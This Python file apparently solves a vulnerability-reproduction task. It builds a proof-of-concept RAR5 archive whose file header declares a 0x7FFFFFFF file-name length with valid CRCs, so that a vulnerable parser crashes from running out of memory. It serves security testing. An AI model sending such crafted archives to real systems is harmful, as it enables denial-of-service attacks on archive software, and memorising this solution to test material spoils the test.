import zlib
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        
        def to_vint(n: int) -> bytes:
            if n == 0:
                return b'\x00'
            res = bytearray()
            while n > 0:
                byte = n & 0x7f
                n >>= 7
                if n > 0:
                    byte |= 0x80
                res.append(byte)
            return bytes(res)

        def create_block(fields_data: bytes) -> bytes:
            header_size_vint = to_vint(len(fields_data))
            data_to_checksum = header_size_vint + fields_data
            crc = zlib.crc32(data_to_checksum)
            crc_bytes = struct.pack('<I', crc)
            return crc_bytes + data_to_checksum

        # 1. RAR5 Signature
        signature = b'Rar!\x1a\x07\x01\x00'

        # 2. Main Archive Header Block (BlockType=1)
        main_header_fields = (
            to_vint(1) +  # HeaderType: 1 (Main Archive Header)
            to_vint(0) +  # HeaderFlags: 0
            to_vint(0)    # ArchiveFlags: 0
        )
        main_header_block = create_block(main_header_fields)
        
        # 3. Malformed File Header Block (BlockType=2)
        # The trigger is a very large FileNameLength, which causes an OOM crash.
        large_name_len = 0x7FFFFFFF
        
        file_header_fields = (
            to_vint(2) +                  # HeaderType: 2 (File Header)
            to_vint(0) +                  # HeaderFlags: 0
            to_vint(0) +                  # DataSize (of packed file data): 0
            to_vint(0x04) +               # FileFlags: HasCRC32
            to_vint(0) +                  # UnpackedSize: 0
            to_vint(0) +                  # FileAttributes: 0
            struct.pack('<I', 0) +        # FileCRC32: 0
            to_vint(0) +                  # CompressionInfo: 0
            to_vint(0) +                  # HostOS: 0
            to_vint(large_name_len)       # FileNameLength: The vulnerability trigger
        )
        file_header_block = create_block(file_header_fields)

        # 4. End of Archive Header (BlockType=5)
        end_header_fields = (
            to_vint(5) +  # HeaderType: 5 (End of Archive)
            to_vint(0)    # HeaderFlags: 0
        )
        end_header_block = create_block(end_header_fields)
        
        poc = signature + main_header_block + file_header_block + end_header_block
        
        return poc